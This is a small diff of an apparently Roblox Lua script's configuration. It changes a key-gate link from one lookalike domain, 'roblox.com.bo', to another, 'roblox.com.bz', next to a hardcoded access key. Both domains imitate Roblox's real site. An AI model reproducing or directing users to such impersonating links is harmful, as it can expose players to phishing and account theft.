@@ -13,7 +13,7 @@ end
 -- Konfiguracja
 local CONFIG = {
     CorrectKey = "ROBLOX_EXPERT_2026",
-    KeyLink = "https://roblox.com.bo/communities/886529599/",
+    KeyLink = "https://roblox.com.bz/communities/886529599/",
 }
 
 -- Główny kontener
